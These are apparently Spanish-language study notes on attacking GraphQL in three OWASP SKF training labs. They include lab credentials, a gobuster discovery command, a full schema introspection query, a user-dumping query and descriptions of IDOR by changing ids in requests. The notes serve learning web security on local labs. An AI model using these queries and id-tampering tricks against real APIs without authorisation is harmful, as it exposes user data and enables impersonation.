> GraphQL es un lenguaje de consulta y tiempo de ejecución para APIs de código abierto, creado por Facebook, que permite a los clientes solicitar exactamente los datos que necesitan y nada más. A diferencia de REST, utiliza un único punto de conexión (endpoint) para obtener datos estructurados de manera eficiente, evitando la sobrecarga o subcarga de información.

## Laboratorios
- [[skf-labs]]/nodeJs/GraphQL-IDOR
	- Credenciales -> johndoe:password1
- skf-labs/nodeJs/GraphQL-Introspection
- skf-labs/nodeJs/GraphQL-Mutation
## Ataques

### 1er Lab
- Hacemos un descubrimiento de rutas
```
gobuster dir -u http://localhost:5000/ -w secLists/Discovery/Web-Content/Dir -t 20
```
- Descubrimos `/settings`
- Si visualizamos esta peticion en [[burpsuite]] veremos que pasa un id:1, eso lo podemos cambiar para ver la informacion sobre otras personas

### 2do Lab
- Vemos las peticion por burpsuite y se descubre que todas las peticiones de en medio pasan por la ruta `/graphql`
- Todas las apis que trabajan con GraphQL tienen una url para realizar pruebas a su api y ver la respuesta, es como un panel que viene con ello.
- Ahora si se puede ver esta pagina y ademas no se sanitiza la entrada es vulnerable a inyecciones maliciosas
```
?query={__schema{types{name,fields{name}}}}
```
- Para representar mejor la respuesta podemos usar este live demo de [voyager](https://apis.guru/graphql-voyager/) que es un visualizador nomas de graphql
- Query para enumerar la base de datos por introspeccion
```
#Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```
- Copias la respuesta en voyager y deberia mostrarte todo lindo, a mi no me muestra un carajo, super divertido
- Querys maliciosas para leer informacion
```
query={Users{id,username,isAdmin}}
```

### 3er Lab
- En mutation podemos crear posts que si miramos con burpsuite hay un valor que se envia el id del usuario, este podemos cambiarlo para subir un post como si fuesemos otro.
- Listo.

